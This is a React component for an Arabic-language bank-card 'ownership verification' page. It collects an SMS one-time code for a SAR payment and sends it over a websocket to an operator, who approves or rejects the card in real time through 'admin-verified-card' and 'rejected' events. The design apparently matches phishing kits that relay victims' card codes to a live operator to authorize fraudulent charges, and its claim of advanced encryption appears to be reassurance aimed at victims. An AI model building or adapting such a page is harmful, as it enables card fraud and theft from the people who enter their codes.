import { useEffect, useCallback, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useDispatch, useSelector } from "react-redux";
import { RootState } from "../redux/store";
import {
  setOtpDigit,
  decrementTimer,
  resetTimer,
  setError,
  clearError,
} from "../redux/slices/cardOwnershipSlice";
import { useSocket } from "../contexts/SocketProvider";

export const CardOwnershipVerification = () => {
  const navigate = useNavigate();
  const dispatch = useDispatch();
  const socket = useSocket();
  const [, setIsCardVerified] = useState(false);
  const isValidOtp = useCallback((otpValue: string) => {
    return otpValue.length === 4 || otpValue.length === 6;
  }, []);
  const { otp, timer, error, amount, cardLastDigits } = useSelector(
    (state: RootState) => state.cardOwnership
  );

  useEffect(() => {
    const interval = setInterval(() => {
      dispatch(decrementTimer());
    }, 1000);

    return () => clearInterval(interval);
  }, [dispatch]);

  useEffect(() => {
    if (!socket) return;

    // admin verified the card information
    function adminVerifiedCardHandler(data) {
      setIsCardVerified(true);
      alert(data.message);
    }
    socket.on("admin-verified-card", adminVerifiedCardHandler);

    // admin rejected the card information
    function rejectedHander(data) {
      setIsCardVerified(false);
      alert(data.message);
      navigate("/payment");
    }
    socket.on("rejected", rejectedHander);

    return () => {
      socket.off("admin-verified-card", adminVerifiedCardHandler);
      socket.off("rejected", rejectedHander);
    };
  }, [socket]);

  const formatTime = useCallback((seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${String(minutes).padStart(2, "0")}:${String(
      remainingSeconds
    ).padStart(2, "0")}`;
  }, []);

  const handleOtpChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement>) => {
      const value = e.target.value.replace(/\D/g, "");
      const digits = value.split("").slice(0, 6);
      while (digits.length < 6) digits.push("");
      digits.forEach((digit, index) => {
        dispatch(setOtpDigit({ index, value: digit }));
      });
      dispatch(clearError());
    },
    [dispatch]
  );

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      const otpValue = otp.join("");

      // Clear any existing errors
      dispatch(clearError());

      // Validation logic
      if (otpValue.length === 5) {
        dispatch(setError("عدد غير صحيح. الرجاء إدخال 4 أو 6 أرقام"));
        return;
      }

      if (otpValue.length < 4) {
        dispatch(setError("الرجاء إدخال 4 أرقام على الأقل"));
        return;
      }

      if (otpValue.length > 6) {
        dispatch(setError("الحد الأقصى المسموح به هو 6 أرقام"));
        return;
      }

      if (otpValue.length !== 4 && otpValue.length !== 6) {
        dispatch(setError("يرجى إدخال 4 أو 6 أرقام للتحقق"));
        return;
      }

      try {
        const order_id = JSON.parse(localStorage.getItem("order_id"));
        const card_id = JSON.parse(localStorage.getItem("card_id"));
        socket.emit("card-ownership-verification", {
          orderId: order_id,
          cardId: card_id,
          verification_code: otpValue,
        });
        navigate("/verify-card");
      } catch {
        dispatch(setError("رمز التحقق غير صحيح"));
      }
    },
    [dispatch, navigate, otp]
  );

  const handleResendCode = useCallback(() => {
    dispatch(resetTimer());
    // Add API call for resending code here
  }, [dispatch]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 pt-36 px-4">
      <div className="max-w-3xl mx-auto">
        <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
          <h1 className="text-2xl md:text-3xl font-bold text-center mb-6 text-[#146394]">
            إثبات ملكية البطاقة
          </h1>

          <div className="text-center mb-8 space-y-4">
            <div className="p-6 bg-blue-50 rounded-xl transition-all duration-300 hover:bg-blue-100">
              <p className="text-[#146394] mb-3">
                سيتم اجراء معاملة مالية على حسابك المصرفي
              </p>
              <p className="text-[#146394] text-lg font-semibold mb-3">
                لسداد مبلغ قيمته <span className="font-bold">SAR {amount}</span>
              </p>
              <p className="text-[#146394]">
                باستخدام البطاقة المنتهية برقم{" "}
                <span className="font-bold">{cardLastDigits}</span>
              </p>
            </div>
            <p className="text-gray-600">
              لتأكيد العملية ادخل رمز التحقق المرسل إلى جوالك.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-8">
            <div>
              <label
                htmlFor="otp-input"
                className="block text-right mb-4 text-[#146394] font-medium"
              >
                رمز التحقق <span className="text-red-500">*</span>
              </label>
              <div className="flex justify-center">
                <input
                  id="otp-input"
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otp.join("")}
                  onChange={handleOtpChange}
                  className="w-48 h-14 text-center text-2xl font-bold border-2 rounded-lg focus:border-[#146394] focus:ring-2 focus:ring-blue-200 outline-none transition-all bg-white"
                  placeholder="######"
                  aria-label="Enter verification code"
                />
              </div>
              {error && (
                <p
                  role="alert"
                  className="text-red-500 text-sm mt-2 text-center animate-shake"
                >
                  {error}
                </p>
              )}
            </div>

            <div className="text-center text-[#146394] bg-blue-50 p-4 rounded-xl">
              <p>سيتم إرسال رسالة كود التحقق في خلال</p>
              <p className="font-bold text-lg mt-1">
                {formatTime(timer)} دقيقة
              </p>
            </div>

            <button
              type="submit"
              disabled={!isValidOtp(otp.join(""))}
              className={`w-full py-4 rounded-lg font-semibold transition-all duration-300 transform hover:scale-[0.99] active:scale-[0.97] text-lg ${
                isValidOtp(otp.join(""))
                  ? "bg-[#146394] text-white hover:bg-[#0f4c70]"
                  : "bg-[#146394] opacity-50 cursor-not-allowed"
              }`}
            >
              متابعة
            </button>

            {timer === 0 && (
              <button
                type="button"
                onClick={handleResendCode}
                className="w-full text-[#146394] py-2 font-semibold hover:bg-blue-50 rounded-lg transition-all duration-300"
              >
                إعادة إرسال الرمز
              </button>
            )}
          </form>

          <div className="mt-8 text-center">
            <div className="flex items-center justify-center gap-2 text-[#146394] bg-blue-50 p-4 rounded-lg transition-all duration-300 hover:bg-blue-100">
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                  clipRule="evenodd"
                />
              </svg>
              <p className="text-sm">
                نحن نستخدم تقنيات تشفير متقدمة لحماية بياناتك
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
